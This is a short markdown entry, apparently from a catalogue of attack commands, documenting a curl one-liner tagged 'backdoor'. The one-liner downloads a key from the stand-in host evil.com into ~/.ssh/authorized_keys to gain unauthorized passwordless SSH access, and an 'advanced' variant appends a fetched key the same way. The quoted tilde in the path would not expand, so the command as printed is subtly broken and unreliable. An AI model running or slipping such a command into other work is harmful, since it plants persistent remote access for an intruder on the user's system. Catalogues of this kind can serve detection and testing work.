---
data: 'curl http://evil.com/key.pub -o "~/.ssh/authorized_keys"'
tags:
  - ssh
  - backdoor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.411Z'
id: 43101c5a-1008-423a-b046-9d108efbe5aa
verified: false
validated: true
submitted: true
---
# curl-authorized-keys-overwrite

## Command

```bash
curl http://evil.com/key.pub -o "~/.ssh/authorized_keys"
```

## Description

Downloads and writes an attacker public key to authorized_keys for unauthorized SSH access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-o` | Output to SSH keys | Yes |
| `http://evil.com/key.pub` | Key source | Yes |
| `"~/.ssh/authorized_keys"` | Target file | Yes |

## Examples

### Basic Usage

```bash
curl http://evil.com/key.pub -o "~/.ssh/authorized_keys"
```

### Advanced Usage

```bash
curl http://evil.com/keys -o "~/.ssh/id_rsa.pub" && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

## Expected Output

Key added; SSH login possible without password.

## Related

- [[commands/curl-bashrc-overwrite]]
